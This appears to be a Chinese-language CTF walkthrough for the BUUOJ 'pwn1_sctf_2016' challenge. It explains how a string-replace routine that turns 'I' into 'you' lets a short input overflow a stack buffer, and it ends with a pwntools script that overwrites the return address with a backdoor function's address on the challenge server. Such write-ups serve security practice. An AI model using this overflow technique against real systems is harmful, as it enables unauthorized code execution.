[https://buuoj.cn/challenges#pwn1_sctf_2016](https://buuoj.cn/challenges#pwn1_sctf_2016)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771043669621-031ebd7a-7dc4-441b-9900-f7dc3f562c31.png)

我们进ida里面看

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771043713176-6136fb9b-bf26-4368-afda-17df8f8c907c.png)

666，这一堆谁看了不蒙

我们找关键的，左边是有后门函数的

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771043761872-69297230-cf60-470d-ba8f-e0973f422506.png)

我们简单看一下伪代码，好像是说先写32字节进s里面，最后再把 s  printf出来，那么32字节能不能填到ebp呢

输入，aaaaaaa，gdb调试发现

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771044494331-b8e22e79-158a-4eba-9872-ec141f2312af.png)

输入的到ebp是0x3c

比32多，无法栈溢出，我们看看中间的代码，有个自己编的replace函数，我们猜测那个I和you应该会互相转换，我们运行试一试

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771044591953-6eaf31a8-e264-462e-be16-6a26643a9174.png)

可以看到我们输入I后后面就变成了you

gdb调试也可以看出来，虽然主要原理不是很懂但我们也可以大胆猜测这道题的解法了

0x3c也就是60

60/3=20，也就是说我们输入20个I就行



```python
from pwn import *
r=remote('node5.buuoj.cn',26636)
flag=0x08048f0d

payload=b'I'*20+b'a'*4+p64(flag)
r.sendline(payload)
r.interactive()
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771045393652-c14fef19-4852-4481-ae56-6659df3aefc0.png)



